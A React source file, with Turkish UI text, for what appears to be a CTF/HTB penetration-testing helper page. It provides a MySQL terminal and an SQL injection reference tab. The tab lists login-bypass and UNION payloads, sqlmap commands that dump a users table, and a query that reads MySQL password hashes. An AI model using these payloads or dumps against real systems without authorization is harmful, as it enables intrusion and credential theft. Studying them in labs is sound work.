import { useRef, useState } from 'react';
import { useJobs } from '../context/JobContext';
import { useSocket } from '../context/SocketContext';
import { useTerminal } from '../hooks/useTerminal';
import { InfoCard, CmdLine, SectionTitle } from '../components/InfoCard';
import { sendCmd } from '../utils/helpers';

const mysqlTermId = 'mysql-main';

function SqlTerminal() {
  const containerRef = useRef(null);
  const { isReady } = useTerminal(mysqlTermId, containerRef);
  return (
    <div className="terminal-container" style={{ height: 260 }}>
      <div className="terminal-titlebar">
        <div className="terminal-dots">
          <div className="terminal-dot red" /><div className="terminal-dot yellow" /><div className="terminal-dot green" />
        </div>
        <div className="terminal-title">
          {isReady ? <span style={{ color: 'var(--accent-green)' }}>● mysql</span> : <span style={{ color: 'var(--text-muted)' }}>○ bağlanıyor...</span>}
        </div>
      </div>
      <div ref={containerRef} style={{ height: 222, padding: '4px 2px' }} />
    </div>
  );
}

export default function SqlPage({ onBack }) {
  const { activeJob, updateJob } = useJobs();
  const { socket } = useSocket();
  const [ip, setIp] = useState(activeJob?.ip || '');
  const [user, setUser] = useState('root');
  const [pass, setPass] = useState('');
  const [port, setPort] = useState('3306');
  const [tab, setTab] = useState('mysql');

  const connect = () => {
    const target = ip || activeJob?.ip || '127.0.0.1';
    if (target && activeJob) updateJob(activeJob.id, { ip: target });
    if (tab === 'mysql') {
      const pFlag = pass ? ` -p${pass}` : ' -p';
      sendCmd(socket, mysqlTermId, `mysql -h ${target} -P ${port} -u ${user}${pFlag}`);
    } else if (tab === 'sqli') {
      sendCmd(socket, mysqlTermId, `sqlmap -u "http://${target}/page.php?id=1" --dbs`);
    }
  };

  return (
    <div>
      <div className="page-header">
        <div>
          <div className="page-header-back" onClick={onBack}>← Ana Menü</div>
          <div className="page-title">💉 <span>SQL</span></div>
          <div className="page-subtitle">MySQL / MariaDB bağlantısı ve SQL Injection referansı</div>
        </div>
      </div>

      <div className="page-tabs">
        {['mysql', 'sqli'].map(t => (
          <div key={t} className={`page-tab ${tab === t ? 'active' : ''}`} onClick={() => setTab(t)}>
            {t === 'mysql' ? '🗃 MySQL' : '💉 SQLi Referans'}
          </div>
        ))}
      </div>

      {tab === 'mysql' && (
        <>
          <div className="ip-bar">
            <span className="ip-bar-label">🎯 Host</span>
            <input value={ip} onChange={e => { setIp(e.target.value); if (activeJob) updateJob(activeJob.id, { ip: e.target.value }); }}
              placeholder={activeJob?.ip || '10.10.10.10'} style={{ flex: 1 }} />
            <span style={{ color: 'var(--text-muted)', fontSize: 11, fontFamily: 'JetBrains Mono' }}>Port</span>
            <input value={port} onChange={e => setPort(e.target.value)} style={{ width: 60, background: 'transparent', border: 'none', outline: 'none', color: 'var(--text-primary)', fontFamily: 'JetBrains Mono', fontSize: 13 }} />
          </div>
          <div style={{ display: 'flex', gap: 10, marginBottom: 12, flexWrap: 'wrap', alignItems: 'flex-end' }}>
            <div className="form-group" style={{ flex: 1 }}>
              <label className="form-label">Kullanıcı</label>
              <input className="form-input" value={user} onChange={e => setUser(e.target.value)} />
            </div>
            <div className="form-group" style={{ flex: 1 }}>
              <label className="form-label">Parola (boş = sormak ister)</label>
              <input className="form-input" value={pass} onChange={e => setPass(e.target.value)} placeholder="parola" />
            </div>
            <button className="btn btn-green" style={{ marginBottom: 0 }} onClick={connect}>🔌 Bağlan</button>
          </div>
          <SqlTerminal />
          <SectionTitle icon="📋">MySQL / MariaDB Komutları</SectionTitle>
          <InfoCard title="Temel Komutlar" icon="🗃" defaultOpen color="green">
            <CmdLine cmd="SHOW DATABASES;" desc="Tüm veritabanlarını listele" termId={mysqlTermId} />
            <CmdLine cmd="USE <veritabani_adi>;" desc="Veritabanını seç" termId={mysqlTermId} />
            <CmdLine cmd="SHOW TABLES;" desc="Seçili veritabanındaki tabloları listele" termId={mysqlTermId} />
            <CmdLine cmd="DESCRIBE <tablo_adi>;" desc="Tablonun sütun yapısını göster" termId={mysqlTermId} />
            <CmdLine cmd="SELECT * FROM <tablo>;" desc="Tablodaki tüm verileri göster" termId={mysqlTermId} />
            <CmdLine cmd="SELECT * FROM users;" desc="Kullanıcı tablosunu oku – sıkça kullanılır!" termId={mysqlTermId} />
            <CmdLine cmd="SELECT user, password FROM mysql.user;" desc="MySQL dahili kullanıcıları ve hash'leri listele" termId={mysqlTermId} />
          </InfoCard>
          <InfoCard title="MariaDB vs MySQL – Ne Fark Var?" icon="ℹ" color="purple">
            <div className="cmd-desc">
              <b>MySQL</b>: Oracle tarafından geliştirilir. Geniş endüstri desteği.<br />
              <b>MariaDB</b>: MySQL'in açık kaynaklı çatalı. Sözdizimi neredeyse aynı.<br /><br />
              HTB ve CTF'lerde her ikisini de aynı komutlarla kullanabilirsin.
              Bağlantı (<code>mysql -h ip -u root -p</code>) her ikisinde de çalışır.
            </div>
          </InfoCard>
        </>
      )}

      {tab === 'sqli' && (
        <>
          <InfoCard title="SQL Injection Bypass Yöntemleri" icon="💉" defaultOpen color="orange">
            <div className="cmd-desc">Giriş alanına eklenen özel karakterler veritabanı sorgusunu kırar veya değiştirir.</div>
            <CmdLine cmd="'" desc="Tek tırnak – SQL hata tespiti" />
            <CmdLine cmd="-- " desc="Yorum satırı – sonrasındaki SQL'i iptal et" />
            <CmdLine cmd="' OR '1'='1" desc="Klasik bypass – her zaman true" />
            <CmdLine cmd="' OR 1=1 -- " desc="Yorum ile bypass" />
            <CmdLine cmd="admin'-- " desc="Parola sorgusunu atla" />
            <CmdLine cmd="' UNION SELECT 1,2,3-- " desc="UNION ile veri çekme (sütun sayısını bul)" />
          </InfoCard>
          <InfoCard title="SQLMap – Otomatik SQLi" icon="🤖" color="green">
            <CmdLine cmd={`sqlmap -u "http://${ip || '10.10.10.10'}/page?id=1" --dbs`} desc="Veritabanlarını listele" termId={mysqlTermId} />
            <CmdLine cmd={`sqlmap -u "http://${ip || '10.10.10.10'}/page?id=1" -D <db> --tables`} desc="Tabloları listele" termId={mysqlTermId} />
            <CmdLine cmd={`sqlmap -u "http://${ip || '10.10.10.10'}/page?id=1" -D <db> -T users --dump`} desc="Tabloyu dump et" termId={mysqlTermId} />
          </InfoCard>
        </>
      )}
    </div>
  );
}
